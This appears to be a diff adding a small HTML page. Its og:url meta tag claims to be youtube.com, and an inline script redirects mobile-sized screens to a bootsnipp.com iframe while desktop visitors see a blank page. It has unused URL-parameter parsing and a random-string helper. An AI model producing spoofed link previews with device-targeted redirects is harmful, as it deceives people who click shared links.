@@ -1,0 +1,45 @@
+<html>
+
+<meta property="og:url"                content="https://www.youtube.com" />
+</head>
+<body>
+<style>
+ 
+</style>
+<p id="demo">
+
+</p>
+<script type="text/javascript">
+
+function generateRandomString(iLen) {
+    var sRnd = '';
+    var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    for (var i = 0; i < iLen; i++) {
+      var randomPoz = Math.floor(Math.random() * sChrs.length);
+      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    }
+    return sRnd;
+  }
+
+function getUrlVars() {
+    var vars = {};
+    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+        vars[key] = value;
+    });
+    return vars;
+}
+var id = getUrlVars()["id"];
+var name = getUrlVars()["name"];
+function visitPage(){
+        window.location = "https://bootsnipp.com/iframe/GlGWX";
+    }
+
+        if (screen.width <= 800) {
+        window.location = "https://bootsnipp.com/iframe/GlGWX";
+    } else {
+       document.getElementById("demo").innerHTML =""
+    }
+
+</script>
+</body>
+</html>
